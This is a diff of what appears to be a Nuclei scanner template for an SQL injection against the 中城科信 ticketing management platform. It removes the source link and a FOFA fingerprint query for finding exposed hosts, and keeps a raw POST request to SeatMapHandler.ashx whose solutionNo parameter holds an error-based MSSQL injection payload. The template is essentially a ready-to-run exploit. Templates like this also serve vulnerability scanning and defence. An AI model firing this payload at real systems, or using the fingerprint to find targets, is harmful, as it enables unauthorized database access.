@@ -3,12 +3,8 @@ info:
   name: 中城科信票务管理平台-SQL注入-SeatMapHandler
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oobwxddm3r01pk8v'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oobwxddm3r01pk8v
-    fofa: '"js/System/jquery.ellipsis.min.js" && icon_hash="1632964065"'
 http:
 - raw:
   - 'POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     Method=GetZoneInfo&solutionNo=%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh
